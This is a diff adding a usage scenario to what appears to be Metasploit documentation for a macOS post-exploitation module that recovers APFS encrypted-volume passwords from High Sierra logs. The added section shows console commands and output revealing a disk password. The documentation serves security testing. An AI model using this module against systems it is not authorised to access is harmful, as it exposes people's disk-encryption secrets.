@@ -25,3 +25,19 @@ This module uses a vulnerability in macOS High Sierra's `log` command. It uses t
   **MOUNT_PATH**
 
   `MOUNT_PATH` is the path on the macOS system where the encrypted drive is (or was) mounted. This is *not* the path under `/Volumes`
+
+## Scenarios
+
+  Typical run against an OSX session, after creating a new APFS disk using Disk Utility:
+
+```
+msf5 exploit(multi/handler) > use post/osx/gather/apfs_encrypted_volume_passwd
+msf5 post(osx/gather/apfs_encrypted_volume_passwd) > set SESSION -1
+SESSION => -1
+msf5 post(osx/gather/apfs_encrypted_volume_passwd) > exploit
+
+[+] APFS command found: newfs_apfs -i -E -S aa -v Untitled disk2s2 .
+[+] APFS command found: newfs_apfs -A -e -E -S secretpassword -v Untitled disk2 .
+[*] Post module execution completed
+msf5 post(osx/gather/apfs_encrypted_volume_passwd) >
+```
